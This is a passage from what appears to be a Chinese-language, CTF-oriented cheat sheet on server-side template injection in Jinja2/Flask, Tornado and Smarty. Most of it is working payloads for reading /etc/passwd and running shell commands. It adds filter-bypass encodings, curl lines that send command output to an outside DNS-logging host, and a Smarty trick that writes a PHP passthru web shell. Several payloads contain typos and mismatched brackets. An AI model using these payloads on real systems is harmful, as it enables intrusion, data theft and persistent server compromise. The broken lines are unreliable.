<p><code>base</code>最为直接，就是直接返回上层的父类，而<code>bases</code>是递归返回所有上面的类，术语上是叫元组，<code>mro</code>同理,但是会包含原来就所属的类</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250414125152769.png" alt="image-20250414125152769"></p>
<p>找到Object之后呢，由于我们的目的是得到一个可以任意命令执行的板块，我们就需要找到<code>os</code>这些类似的方法，那么就要用到<code>__subclass__()</code>以及后面的一些东西</p>
<p>subclasses是返回子类，通常这个时候就会跳一大串的子类，没脚本是不得行的(不是哥们你真想手找吗)</p>
<p>而返回子类后我们就要做出一个重大的决策，根据版本打不同的payload,详见文件读取的子类(py2人上人)</p>
<p>一般我们的选择 是两种</p>
<ul>
<li>文件读取</li>
<li>内置模块任意命令执行</li>
</ul>
<pre><code class="highlight python"><span class="comment">#文件读取</span>
<span class="comment">#python2</span>
file -&gt;(<span class="string">&#x27;path&#x27;</span>).read()
<span class="comment">#python3</span>
_frozen_importlib_external.FiieLoader -&gt;[<span class="string">&quot;get_data&quot;</span>](<span class="number">0</span>,<span class="string">&quot;/etc/passwd&quot;</span>)
<span class="comment">#当然也可以拿内置模块再文件读取，但是感觉不得已才会这样打</span></code></pre>

<pre><code class="highlight python"><span class="comment">#函数rce</span>
<span class="comment">#不知道和版本有没有关系，反正找到还没有被过滤直接打就行</span>
&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[xx].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>)&#125;&#125;
&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]__.__subclasses__()[xx].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;
&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">58</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami’)&#125;&#125;</span>
<span class="string">&#123;&#123; &#x27;</span><span class="string">&#x27;.__class__.__base__.__subclasses__()[10].__init__.__globals__[&#x27;</span>__builtins__<span class="string">&#x27;][&#x27;</span><span class="built_in">eval</span><span class="string">&#x27;](&#x27;</span><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;cat /flag&quot;</span>).read()<span class="string">&#x27;) &#125;&#125;#eval</span></code></pre>

<pre><code class="highlight python"><span class="comment">#类的rce</span>
&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]__.__subclasses__()[xx][<span class="string">&#x27;load_moudule&#x27;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ls&quot;</span>).read()&#125;&#125;<span class="comment">#importlib</span>
&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro[<span class="number">2</span>]__.__subclasses__()[xx](<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;<span class="comment">#subprocess.Popen 个人觉得唯一真神好吧</span></code></pre>

<pre><code class="highlight python"><span class="comment">#内置OS模块rce(这个其实就多了哈哈)不管类内置的还是函数内置的有就行了，这边重点介绍类的吧，因为函数内置的后面会讲的</span>
os._wrap_close //<span class="number">117</span>
warnings.catch_warnings //<span class="number">59</span>
warnings.WarningMessage
socket._socketobject
site._Printer //<span class="number">71</span>
site.Quitte
subprocess.Popen //<span class="number">258</span></code></pre>

<p>再贴一个找到内置os模块的脚本</p>
<pre><code class="highlight plaintext">#coding:utf-8search = &#x27;os&#x27;   #也可以是其他你想利用的模块
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try:
        if search in i.__init__.__globals__.keys():
            print(i, num)
    except:
        pass</code></pre>

<p>后面的操作就比较公式化了</p>
<p>直接贴一下好了</p>
<pre><code class="highlight python"><span class="comment">#python2</span>
__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)
__init__.func_globals.linecache.os.popen(<span class="string">&#x27;id&#x27;</span>).read()
__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span>)
__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)
__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)

<span class="comment">#python3</span>
__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;file&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()
__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)
__init__[<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()
__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].listdir(<span class="string">&#x27;.&#x27;</span>)
__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span>
<span class="string">__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read()</span>
<span class="string"></span></code></pre>

<p><strong>觉得烦?那最快的就来了</strong></p>
<p>利用flask内置函数，效率高，payload短，就是容易被ban(</p>
<pre><code class="highlight jinja2">1)config #获取配置信息
&#123;&#123;config.__class__.__init__.__globals__[&quot;os&quot;].popen(&quot;cat+/flag&quot;).read()&#125;&#125;

2)lipsum
&#123;&#123; lipsum.__globals__.__builtins__.open(&#x27;/flag&#x27;).read() &#125;&#125;

3)request
&#123;&#123;request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;).read()&#125;&#125;
&#123;&#123;request.application.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;).read()&#125;&#125;

4)url_for
&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;
利用其读到环境变量:url_for.__globals__[&#x27;current_app&#x27;].config
5)get_flashed_messages
&#123;&#123;get_flashed_messages.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;
利用其读到环境变量:get_flashed_messages.__globals__[&#x27;current_app&#x27;].config</code></pre>



<p><strong>总结一下，就是先找到一个合适的攻城锤(内含os的类或可命令执行的函数)和一把趁手的宝剑(可以使用的方法)</strong></p>
<h4 id="jinja2的过滤"><a href="#jinja2的过滤" class="headerlink" title="jinja2的过滤"></a>jinja2的过滤</h4><p><strong>过滤[</strong></p>
<pre><code class="highlight python"><span class="comment">#getitem、pop</span>
<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()
<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="string">&#x27;ls&#x27;</span>).read()
<span class="comment">#也可以用__getattribute__绕过</span>
&#123;&#123;<span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>).__base__&#125;&#125;
<span class="comment">#或者配合request</span>
&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(<span class="number">376</span>).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami

<span class="comment">#或者用print标记</span>
&#123;%<span class="built_in">print</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)%&#125;</code></pre>

<p><strong>过滤引号</strong></p>
<pre><code class="highlight plaintext">#chr函数
&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;
&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()&#125;&#125;
#request对象
&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd
#命令执行
&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;
&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;
&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id
#request 绕过
&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd    
\#分析：
request.args 是flask中的一个属性,为返回请求的参数,这里把path当作变量名,将后面的路径传值进来,进而绕过了引号的过滤。
若args被过滤了，还可以使用values来接受GET或者POST参数。：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;
Cookie:arg1=open;arg2=/etc/passwd
&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;
post:arg1=open&amp;arg2=/etc/passwd</code></pre>

<p><strong>过滤下划线</strong></p>
<pre><code class="highlight plaintext">&#123;&#123;&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
//request.args.xx就能直接查询对应的参数值，把原参数换成[request.args.xx]即可</code></pre>

<p><strong>过滤花括号</strong></p>
<pre><code class="highlight plaintext">#用&#123;%%&#125;标记，同时外带
&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;).read()==&#x27;p&#x27; %&#125;1&#123;% endif %&#125;
&#123;% if ().__class__.__base__.__subclasses__()[433].__init__.__globals__[&#x27;popen&#x27;](&quot;curl `whoami`.k1o75b.ceye.io&quot;).read()==&#x27;kawhi&#x27; %&#125;1&#123;% endif %&#125;</code></pre>

<p><strong>过滤关键字</strong></p>
<ul>
<li>利用内置的语法传参的值：</li>
</ul>
<p>如<code>request.args.[变量名](get传参) request.cookies.[变量名](cookies传参)</code></p>
<ul>
<li>使用切片将逆置的关键字顺序输出，进而达到绕过。</li>
</ul>
<pre><code class="highlight plaintext">&quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]
&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)</code></pre>

<ul>
<li>反转</li>
</ul>
<pre><code class="highlight plaintext">&quot;&quot;[&quot;__ssalc__&quot;][::-1]
&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])</code></pre>

<ul>
<li>利用”+”进行字符串拼接，绕过关键字过滤。</li>
</ul>
<pre><code class="highlight plaintext">&#123;&#123;()[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__subclasses__()[40].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&quot;__im&quot;+&quot;port__(&#x27;o&#x27;+&#x27;s&#x27;).po&quot;&quot;pen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;
[][%27__cla%27+%27ss__%27][%27__ba%27+%27se__%27][%27__subcl%27+%27asses__%27]()[117][&quot;__in&quot;+&quot;it__&quot;][&quot;__glo&quot;+&quot;bals__&quot;][&#x27;popen&#x27;](&#x27;ls /&#x27;).read()</code></pre>

<ul>
<li>join拼接</li>
</ul>
<p>利用join（）函数绕过关键字过滤</p>
<pre><code class="highlight plaintext">&#123;&#123;[].__class__.__base__.__subclasses__()[40](&quot;fla&quot;.join(&quot;/g&quot;)).read()&#125;&#125;
&#123;&#123;()|attr([&quot;_&quot;*2,&quot;cla&quot;,&quot;ss&quot;,&quot;_&quot;*2]|join)&#125;&#125;
&#123;&#123;()|attr(request.args.f|format(request.args.a))&#125;&#125;&amp;f=__c%sass__&amp;a=l</code></pre>

<ul>
<li>利用引号绕过</li>
</ul>
<pre><code class="highlight plaintext">[&#123;&#123;[].__class__.__base__.__subclasses__()40&quot;/fl&quot;&quot;ag&quot;.read()&#125;&#125;]()</code></pre>

<ul>
<li>使用str原生函数replace替换</li>
</ul>
<p>将额外的字符拼接进原本的关键字里面，然后利用replace函数将其替换为空。</p>
<pre><code class="highlight plaintext">&#123;&#123;().__getattribute__(&#x27;__claAss__&#x27;.replace(&quot;A&quot;,&quot;&quot;)).__bases__[0].__subclasses__()[376].__init__.__globals__[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&#125;&#125;</code></pre>

<ul>
<li>ascii转换</li>
</ul>
<pre><code class="highlight plaintext">将每一个字符都转换为ascii值后再拼接在一起。

&quot;&#123;0:c&#125;&quot;.format(97)=&#x27;a&#x27;
&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95)=&#x27;__class__&#x27;</code></pre>

<ul>
<li>16进制编码绕过</li>
</ul>
<pre><code class="highlight plaintext">&quot;__class__&quot;==&quot;\x5f\x5fclass\x5f\x5f&quot;==&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;

例子：
&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&#x27;](&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;
\
同理，也可使用八进制编码绕过</code></pre>

<ul>
<li><p>base64编码绕过</p>
<p>对于python2，可利用base64进行绕过，对于python3没有decode方法，不能使用该方法进行绕过。</p>
</li>
</ul>
<pre><code class="highlight plaintext">&#123;&#123;().__getattribute__(&#x27;X19jbGFzc19f&#x27;.decode(&#x27;base64&#x27;)).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;
//__class__</code></pre>

<p>例子：</p>
<pre><code class="highlight plaintext">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;X19idWlsdGluc19f&#x27;.decode(&#x27;base64&#x27;)][&#x27;ZXZhbA==&#x27;.decode(&#x27;base64&#x27;)](&#x27;X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==&#x27;.decode(&#x27;base64&#x27;))&#125;&#125;  
等价于  
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</code></pre>

<ul>
<li>unicode编码绕过</li>
</ul>
<pre><code class="highlight jinja2">&#123;%print((((lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;os&quot;))|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0074\u0061\u0063\u0020\u002f\u0066\u002a&quot;))|attr(&quot;\u0072\u0065\u0061\u0064&quot;)())%&#125;
等同于lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;tac /f*&#x27;).read()</code></pre>

<ul>
<li>Hex编码绕过</li>
</ul>
<pre><code class="highlight jinja2">[&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;][&#x27;\x65\x76\x61\x6c&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;]()
&#123;#温馨提示，连关键词都转换掉是有概率褒姒的，推荐用来绕过一下符号的过滤差不多够用了#&#125;

&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;\x6f\x73&#x27;].popen(&#x27;\x6c\x73\x20\x2f&#x27;).read()&#125;&#125;   
等价于   
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</code></pre>

<ul>
<li>绕过i<strong>nit</strong><br>可以用<code>__enter__</code>或<code>__exit__</code>替代<code>__init__</code></li>
</ul>
<pre><code class="highlight plaintext">&#123;().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</code></pre>

<pre><code class="highlight plaintext">&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</code></pre>

<ul>
<li>绕过config</li>
</ul>
<pre><code class="highlight plaintext">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;
&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125;</code></pre>

<ul>
<li>过滤args和.和_</li>
</ul>
<pre><code class="highlight plaintext">&#123;&#123;()|attr(request[&#x27;values&#x27;][&#x27;x1&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x2&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x3&#x27;])()|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(40)|attr(request[&#x27;values&#x27;][&#x27;x5&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x6&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(request[&#x27;values&#x27;][&#x27;x7&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(request[&#x27;values&#x27;][&#x27;x8&#x27;])(request[&#x27;values&#x27;][&#x27;x9&#x27;])&#125;&#125;

post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&#x27;whoami&#x27;).read()</code></pre>

<h4 id="打马环节-待补完"><a href="#打马环节-待补完" class="headerlink" title="打马环节(待补完)"></a>打马环节(待补完)</h4><h3 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h3><pre><code class="highlight plaintext">神必龙卷风</code></pre>

<h4 id="基础了解"><a href="#基础了解" class="headerlink" title="基础了解"></a>基础了解</h4><p><code>Tornado</code>是一个具有异步功能的简单web框架</p>
<pre><code class="highlight python"><span class="keyword">import</span> tornado.ioloop
<span class="keyword">import</span> tornado.web

<span class="keyword">class</span> <span class="title class_">MainHandler</span>(tornado.web.RequestHandler):
    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):
        <span class="variable language_">self</span>.write(<span class="string">&quot;Hello, world&quot;</span>)

<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
    application = tornado.web.Application([
        (<span class="string">r&quot;/&quot;</span>, MainHandler),
    ])
    application.listen(<span class="number">8888</span>)
    tornado.ioloop.IOLoop.current().start()</code></pre>

<p>它使用<code>RequestHandler</code>来处理发送过来的web请求</p>
<h4 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h4><p>这里大部分的payload是万卷不离其宗的(指继承链)</p>
<p>如果要谈特性</p>
<p>大概是<code>application</code></p>
<p>因为<code>Tornado</code>模板一般需要引入<code>Tornado.web</code></p>
<p>而在<code>Tornado.web.application</code>下就可以发现框架的<code>settings</code></p>
<h2 id="PHP模板注入"><a href="#PHP模板注入" class="headerlink" title="PHP模板注入"></a>PHP模板注入</h2><p>php常见的模板：twig，smarty，blade</p>
<h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>PHP模板的鼻祖，后来的php模板大多都是基于其发展起来的</p>
<p>基本确定指令</p>
<pre><code class="highlight php">&#123;<span class="variable">$smarty</span>.version&#125; <span class="comment">//查看smarty的版本来确定姿势</span></code></pre>

<p>说实话，smarty的姿势还是蛮多的，先给三种比较常见的吧</p>
<ul>
<li><p>基于XFF的普通注入:在{}内疯狂输出</p>
</li>
<li><p>利用{include}来任意文件读取；string:{include file&#x3D;’D:\flag.txt’}这时文本内容就被读取了</p>
</li>
</ul>
<h4 id="通过self获取Smarty类再调用其静态方法"><a href="#通过self获取Smarty类再调用其静态方法" class="headerlink" title="通过self获取Smarty类再调用其静态方法"></a><strong>通过self获取Smarty类再调用其静态方法</strong></h4><p><strong>getStreamVariable:</strong></p>
<pre><code class="highlight php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)//<span class="title">variable</span>其实就是文件路径</span>
<span class="function"></span>&#123;
        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;
        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);<span class="comment">//从此处开始对文件进行读取</span>
        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;
            <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;
                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;
            &#125;
            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);
            <span class="keyword">return</span> <span class="variable">$_result</span>;
        &#125;
        <span class="variable">$smarty</span> = <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;smarty) ? <span class="variable language_">$this</span>-&gt;smarty : <span class="variable language_">$this</span>;
        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;
            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);
        &#125; <span class="keyword">else</span> &#123;
            <span class="keyword">return</span> <span class="literal">null</span>;
        &#125;
    &#125;
<span class="comment">//可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法</span>
smarty/libs/sysplugins/smarty_internal_data.php　　——&gt;　　<span class="title function_ invoke__">getStreamVariable</span>() 这个方法可以获取传入变量的流
例如：
&#123;<span class="built_in">self</span>::<span class="title function_ invoke__">getStreamVariable</span>(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</code></pre>

<p>payload形如：<code>&#123;self::getStreamVariable(“file:///etc/passwd”)&#125;</code> &#x2F;&#x2F;在v3.1.30退出历史舞台</p>
<p><strong>writeFile：</strong></p>
<p>这个不是很懂，直接引用这个大佬的博客吧</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250307213236244.png" alt="image-20250307213236244"></p>
<pre><code class="highlight php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params"><span class="variable">$_filepath</span>, <span class="variable">$_contents</span>, Smarty <span class="variable">$smarty</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="variable">$_error_reporting</span> = <span class="title function_ invoke__">error_reporting</span>();
        <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span> &amp; ~E_NOTICE &amp; ~E_WARNING);
        <span class="variable">$_file_perms</span> = <span class="title function_ invoke__">property_exists</span>(<span class="variable">$smarty</span>, <span class="string">&#x27;_file_perms&#x27;</span>) ? <span class="variable">$smarty</span>-&gt;_file_perms : <span class="number">0644</span>;
        <span class="variable">$_dir_perms</span> = <span class="title function_ invoke__">property_exists</span>(<span class="variable">$smarty</span>, <span class="string">&#x27;_dir_perms&#x27;</span>) ? (<span class="keyword">isset</span>(<span class="variable">$smarty</span>-&gt;_dir_perms) ? <span class="variable">$smarty</span>-&gt;_dir_perms : <span class="number">0777</span>)  : <span class="number">0771</span>;
        <span class="keyword">if</span> (<span class="variable">$_file_perms</span> !== <span class="literal">null</span>) &#123;
            <span class="variable">$old_umask</span> = <span class="title function_ invoke__">umask</span>(<span class="number">0</span>);
        &#125;

        <span class="variable">$_dirpath</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_filepath</span>);
        <span class="comment">// if subdirs, create dir structure</span>
        <span class="keyword">if</span> (<span class="variable">$_dirpath</span> !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_dirpath</span>)) &#123;
            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$_dirpath</span>, <span class="variable">$_dir_perms</span>, <span class="literal">true</span>);
        &#125;

        <span class="comment">// write to tmp file, then move to overt file lock race condition</span>
        <span class="variable">$_tmp_file</span> = <span class="variable">$_dirpath</span> . DS . <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;_&#x27;</span>, <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;wrt&#x27;</span>, <span class="literal">true</span>));
        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;
            <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);
            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);
       &#125;</code></pre>

<p>我们在往上面看，可以看到这个方法是在<code>class Smarty_Internal_Runtime_WriteFile</code>下的，</p>
<p>我们注意看这段代码</p>
<pre><code class="highlight php"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;
            <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);
            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);
       &#125;</code></pre>

<p>这段代码将文件内容写入临时文件，如果写入失败，则恢复先前的错误报告级别，并抛出异常。</p>
<p>这里的具体解释我会在下面的CVE-2017-1000480具体讲到，先挖个坑，这里写入临时文件，在loadCompiledTemplate函数下，存在语句</p>
<pre><code class="highlight php"><span class="keyword">eval</span>(<span class="string">&quot;?&gt;&quot;</span> . <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filepath));</code></pre>

<p>就有了</p>
<pre><code class="highlight php">&#123;<span class="title class_">Smarty_Internal_Write_File</span>::<span class="title function_ invoke__">writeFile</span>(<span class="variable">$SCRIPT_NAME</span>,<span class="string">&quot;&lt;?php passthru(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::<span class="title function_ invoke__">clearConfig</span>())&#125;</code></pre>

<p>我们将<code>&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;</code>写入了临时php文件中</p>
<p><code>self::clearConfig()</code> 是一个 Smarty 内部方法，用于清除模板引擎的配置选项。</p>
<p><code>$SCRIPT_NAME</code> 是一个在 PHP 中预定义的变量，用于表示当前执行脚本的文件路径和名称。</p>
<p>但是writeFile方法也有版本限制，所以我们首先要确定模板的版本，再决定对应的攻击方法。</p>
<h4 id="标签"><a href="#标签" class="headerlink" title="标签:"></a>标签:</h4><p><strong>{$smarty.version}</strong></p>
<p>获取smarty的版本信息</p>
<p><strong>{literal}</strong></p>
